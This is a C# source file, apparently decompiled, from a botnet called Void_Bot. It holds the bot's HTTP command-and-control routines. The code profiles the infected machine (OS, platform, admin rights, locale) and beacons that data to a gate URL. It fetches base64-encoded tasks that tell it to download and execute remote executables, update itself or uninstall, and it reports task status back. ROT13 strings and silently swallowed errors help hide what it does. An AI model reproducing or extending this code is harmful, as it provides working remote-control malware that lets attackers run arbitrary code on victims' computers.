using System;
using System.Net;
using System.Text;
using System.Threading;

namespace Void_Bot.Core;

internal class HTTP
{
	private const int TASK_EXECUTED = 1;

	private const int TASK_FAILED = 0;

	public static void RequestAndParseTasks()
	{
		try
		{
			string text = string.Empty;
			using (WebClient webClient = new WebClient())
			{
				string s = Config.BotData_ID + "," + Config.Environment_OS + "," + Config.Environment_Platform + "," + (Config.Environment_IsAdmin ? "A" : "U") + "," + Config.Environment_Locale + "," + Config.Config_BotVersion;
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				s = Convert.ToBase64String(bytes);
				try
				{
					text = webClient.DownloadString(Config.Config_GateURL + Cryptography.ROT13("?k=") + s);
				}
				catch
				{
				}
			}
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			byte[] bytes2 = Convert.FromBase64String(text);
			text = Encoding.UTF8.GetString(bytes2);
			string[] array = text.Split(new char[1] { ',' });
			for (int i = 0; array[i] != Config.Config_Command_EndOfTasklist; i++)
			{
				string[] Parameters = array[i].Split(new char[1] { ' ' });
				if (string.IsNullOrEmpty(Parameters[0]) || string.IsNullOrEmpty(Parameters[1]))
				{
					continue;
				}
				SendTaskStatus(Parameters[0], 1);
				if (Parameters[1] == Config.Config_Command_ExecuteFile)
				{
					if (!string.IsNullOrEmpty(Parameters[2]))
					{
						new Thread((ThreadStart)delegate
						{
							string text2 = Functions.DownloadFile(Parameters[2], Cryptography.ROT13("rkr"), Execute: true);
							if (text2 == Config.Const_FunctionError)
							{
								SendTaskStatus(Parameters[0], 0);
							}
						}).Start();
					}
					else
					{
						SendTaskStatus(Parameters[0], 0);
					}
				}
				else if (Parameters[1] == Config.Config_Command_UpdateBot)
				{
					if (!string.IsNullOrEmpty(Parameters[2]))
					{
						new Thread((ThreadStart)delegate
						{
							if (!Functions.UpdateBot(Parameters[2]))
							{
								SendTaskStatus(Parameters[0], 0);
							}
						}).Start();
					}
					else
					{
						SendTaskStatus(Parameters[0], 0);
					}
				}
				else if (Parameters[1] == Config.Config_Command_UninstallBot)
				{
					Functions.UninstallBot();
				}
				else
				{
					SendTaskStatus(Parameters[0], 0);
				}
			}
		}
		catch
		{
		}
	}

	public static void SendTaskStatus(string TaskID, int Status)
	{
		try
		{
			string s = Config.BotData_ID + "," + TaskID + "," + ((Status == 1) ? "1" : "0");
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			s = Convert.ToBase64String(bytes);
			using WebClient webClient = new WebClient();
			webClient.DownloadString(Config.Config_GateURL + Cryptography.ROT13("?l=") + s);
		}
		catch
		{
		}
	}
}
